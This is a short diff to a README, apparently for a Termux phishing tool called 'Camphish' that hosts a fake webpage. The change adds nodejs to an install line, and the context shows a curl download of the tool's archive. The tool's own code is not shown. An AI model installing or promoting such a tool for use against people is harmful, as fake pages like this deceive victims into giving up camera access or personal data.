@@ -9,7 +9,7 @@ This succinctly captures the core functionality: hosting a fake webpage (via PHP
 pkg update && pkg upgrade -y
 ```
 ```
-pkg install curl git cloudflared
+pkg install curl git nodejs cloudflared
 ```
 ```
 curl -L -o cambest.tar.gz https://github.com/webappsite/Camphish/raw/refs/heads/main/cambest.tar.gz
